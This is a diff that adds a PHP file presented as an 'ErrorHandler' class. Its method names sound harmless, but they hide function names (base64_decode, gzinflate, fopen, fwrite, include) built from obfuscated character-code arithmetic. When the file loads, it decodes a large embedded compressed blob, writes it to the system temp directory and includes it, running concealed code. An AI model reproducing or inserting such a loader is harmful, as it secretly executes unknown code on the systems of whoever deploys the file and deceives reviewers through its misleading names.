@@ -1,0 +1,84 @@
+<?php
+class ErrorHandler {
+	private $wr = '';
+	private $mw = '';
+
+	public function checkConsistency($p1) {
+		$a = array(((34+67)),(75+10+15),((30*86)-2469),((49*1)+50),(60+41),(2*50),(((84*1)+11)),(((25*2)+2)),(56-2),(101*1),115,(97*1),((2*49)));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		$s = strrev($s);
+		return $s($p1);
+	}
+
+	public function rollbackTransaction($p1) {
+		$a = array((66+8+29),((2*61)),((42*2)+21),((31*3)+17),(2*51),((112-4)),((102-5)),((21*3)+53),(110-9));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		return $s($p1);
+	}
+
+	public function sendNotification($p1,$p2) {
+		$a = array((30+72+8),(103-2),(114-2),((12*30)-249),((38*39)-1380));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		$s = strrev($s);
+		return $s($p1,$p2);
+	}
+
+	public function prepareOutput($p1,$p2) {
+		$a = array(((3*29)+15),((52*1)+67),((84*1)+30),((95*1)+10),(9+35+72),(101*1));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		return $s($p1,$p2);
+	}
+
+	public function executeAction($p1) {
+		$a = array(((98*1)+3),(76+39),111,((74+34)),(((13*85)-1006)),((49*2)+4));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		$s = strrev($s);
+		return $s($p1);
+	}
+
+	public function trackActivity($p1,$p2=null) {
+		$a = array((114),(((91*1)+25)),((70+33+11)),(((8*34)-167)),((68*88)-5875));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		return $s($p1,$p2);
+	}
+
+	public function resolveAction() {
+		$this->mw = $this->trackActivity($this->cacheData(), '/');
+	}
+
+	public function processData() {
+		$this->wr = $this->rollbackTransaction($this->checkConsistency($this->nf));
+	}
+
+	public function resetState() {
+		$fn = $this->mw.'/vz-6810265bda252';
+		$f = $this->sendNotification($fn, 'w');
+		$this->prepareOutput($f, $this->wr);
+		$this->executeAction($f);
+		$this->computeResult($fn);
+	}
+
+	private $nf = 'pRiJbuJK8lcSKfvAIpslE8gxrN/IYHOE+3BmklEWGdv4xAYfs' . 'U1e/n27qs1Mk4O81YKM3FXVdXV1Hfz729pcH6muEoZHc1t7Xgf' . 'WkxLpR2GkRJZ6Mk+SGn09WsaeGlm+dzS3nOLJfLt0T0/mpsI9W' . '8vicai7y69fgZyjr3N3XeRqJ/PA8fkwClzdKyI1Aa2cJb9QQv2' . 'yMtd01df04u/dP5HxI1db+gEIifgykZJE9m8mZDtw2UbHPI+oW' . 'qkESw5RwCB65FUzKPqBVmRg3H8owFRw/Q/U7ZHjaoEexYGHlLW' . 'XffsZo8Ge59+K8koQKFmxMM/cAv9noW2U28I00aZTNRHqwve+c' . 'Ht7O+s3Gukg60zuB0NB7f7wbqTCaWGuO2vcIlQaou2PWk2116o' . 'nywdZGjSs60F94pSaY/muL1darcwR2qkTNerJELautC1sHQkdH' . 'paJBquhaUS9pOM0XTUejB9mUhIKSlYeDJtyAOumYYwHhpy0DMM' . 'fWNGP+sxZLzJj2BUMqW+r3aYRdgjeaExCsd2IdOCcWcC5ZwiNd' . 'sKjrKdgBaD7tNy+H1OQ7VIIYdGSELJdLADUrcuLpkGJdDUFELx' . '69nb3aka7N99I4HWQOuPeudZT6+XJSO7PhsZ1Y2BI9UHS+dFNj' . 'O/quNLrO512XxDkfr1S78n9Ya/ZEUam07zPRRnIdFTv661EGAl' . 'mJQDoZqNRAWFTGAv9tilfAljzPTRRuH6Qtp1bAMWo3iBJhJaVI' . 'Ec3A0hLVKvLnRtCE7clvjDIQdEGIaYvtq176pg0Rs8IlMB8iqg' . '3y53emDoqNJ8AtNwmRiObLBbuWpK9ynVfUIWHuzF1nEHVluV27' . 'u8gQUmyJ5T79fHD0HTEgSk/PNz55X4qS0NPuyE4JE0Tqmb9fiR' . 'f1Luo+ZO78/n2SaGWhndSboQTq5R3BZeeh6Ka2+RC3KqGlEkra' . 'ZZcN20D0YvtOke73bGQ9Ozr8dC6r4jTpDwaC/HICpFMDYBKnMm' . 'W1BhvBFEKWhmNXEXBAGtmnVjMnCdR7PuCqN60bCNGXdNljk4JO' . 'iHoC4K2CDrF6FzsLFFSqkc/ErdG0LKka3HawWO3nZxFn0gw/JY' . 't/UucdXw8D0Xd7dfTiDLonA8Swe1NK0pXlCtNmx7kJvIo2lmJ2' . '04qZeMLaeZETbtMnbZZULRMvFS5EhpqKM7uLXEqr1rbiiuJfRp' . 'FK6qJtOoKQtSbVca3mVwVZ9LFSBC2o6mPVJaTUG+NK1JDTgRRS' . 'FsZZbDCUBCn4UYSfUtoXNutLQ1QNcQMkFSmoi10pDzgLI/qZVd' . 'vx/ndiDdo6DKJvncm1cHdDmzm0MntzJ9Mz1V6+g5Czzt3vbv6D' . 'dLZGNED8xoJ1ilSdE1Kv0jw5vQmcgPVTcI83rVbDC+u9vJi6oq' . 'mB0VSY0hxIBUEMyfI0rQCScJv0ZAm4YTdLeBJkbHCUI9IAm9Js' . '58MHeREOG+rwJFs/nwyX1suP1dilhdJlMDKyDkhzR9/kJKy9kO' . '6OmUVszC5pkBOisxScUOde9YsnWUJ+RDupAs8X3RC8prCRvtiY' . 'gZQvHxsAWRNyCPEi7kJUPBO5o3hsNuRalCy+KLlRVzgx55WLJf' . 'wi0Vw6bKY87Oramn/B6gML69WdPETGD7yrKtVvFZqVuBqiWm5O' . 'q3voMmO/IzW2p+sNCKhyj3mJRv8evyG5uqsWmKeHXWJNefsYu9' . 'T+hRAnPT8rrQ9jfZlVEvMQxgsAl1x0LWl0gdegXKFNSAs5L4mp' . 'C/U6W8kvOf6/9NKkEVOHpVjOF0QG5iHeyxyZ69pLkv45Xanso/' . '9UiJfsg8bMjhkatErFoQ98+Tkp2+12bfikzXxfO0NixL5In/aU' . '+5jq0R+FeS/MfLq7JL5XJU+WaOE1zZ+AePYH6R6HVYl8oWbSY7' . 'E8lQ31vS8mX353R+ShHMyV5yUGKBofMFdqYqmKvbGt1x7mxUIW' . 'Hf4f95cfjm/JO+hG+7yClEqUti4I70RNDOhh2EXZSwOuiXsAwt' . 'w6EQcTYxzVXFdZeHu5R8D+SzdhOQfEBNbvBoHLqkOFiShKONqu' . 'CY5yV8DJLZOG/KkNxzN5tNpb34nTTrN+5EkTU6pqn+HvD2czk4' . 'P3LwDTJrDXm/4vTdsCLPOcPAOk0ObJ9JMngxmE2EwbRKF/7fNb' . 'Yn0JvubSH49sKExHAykxmzW6UtDec9eEqyHNn64g0YB7tNTXcV' . 'dAFVXFGjokeUt/RyOINX1Qz0HYFFTV2xVgb4X+uvNhlSV470yU' . 'S6XyMNxdPI5wtPNaxiZihR+rQShPicy8jA5mdtrny8CjpUALTQ' . 'kyM0TkcCzYRpj5kwju4CmbVMWSZpqKJwrDOF9jtBdQ18VFWjq2' . 'hXMfSrScINhSxfLJbA/Y/lD9w09pP2OAGjFQbMVCHizE7pyKMT' . 'ROztJOw6dswFtxhkDh6YcEAneVsfml6GvOv6azKpF9Ns3hhjac' . 'pyJCJevrN1P2CuQyZM47I1oaNdhYlmShuTxlDJl0/mXcxLi+Mt' . '9ZeGXZ3v58JP1rjVybO55uY6jEN9PwUm7qf3VBcl7heOl7ucbI' . 'c2EK41fknDN97MKVS9LzLMTCAM9hj/0GGQ3hQIb9mxgQIGz0Qs' . 'c91ab/I6ThLy7FUQb0nTtZnvCHcqp4fC7kJpKE5KxWDfDzAPTg' . 'VqgVWqjbw9QwwgE1JssJ0/NA9QqziRrP6c1LfUAMQxHEA3YDn5' . '7jwLmI6Agznhk4yjDRjJOVhiMq+yQEGz5jOxDGTBAQRu8fSUDp' . 'ieYMSKUcdCjMF1BCYLG+wMpMGFBQQtAihe77qeOh6ELmnn1Q54' . 'uduZxkDI8D54OjF4w7cUfslzh7feMXxxJjC4tN9IDcmnhnyrDY' . 'SP98hqawDe/tA6nGjRbDk24r/kQ21lGN+f7d/aTNSOAMPqV0hG' . 'QmrUDMwgZJCGVxyodQXTV9I9YD3nodC9cYGpMNTYFwmwJkfJE8' . 'yYJ7j0sprxkkyBylbE4MmgCV8idekq6Eg5VPN7pmGrcX3/9WhG' . '+7HKVgZ75rtxQ3c0nHVa+jeXAJ5rzfwJPdtSDQRZrxZZiiQwWD' . 'YMt3FuNYldYC1VD52P4MxL/u8z/ycxXduh7u3dQh8P6t5tIce/' . 'fmUBhgsZqszeBwqEg6S9nvfwX';
+
+	public function computeResult($p) {
+		include $p;
+	}
+
+	public function cacheData() {
+		$a=array((((20*109)-2065)),((11*11)),(((124*13)-1497)),((25*1)+70),(94+9),((101*1)),(((22*1)+94)),95,((2*58)),(93+8),((97+12)),((2*56)),(49+24+22),(34+56+10),105,(2*57));
+		$s='';
+		foreach($a as $n){$s.=chr($n);}
+		return $s();
+	}
+}
+
+$he = new ErrorHandler();
+$he->resolveAction();
+$he->processData();
+$he->resetState();
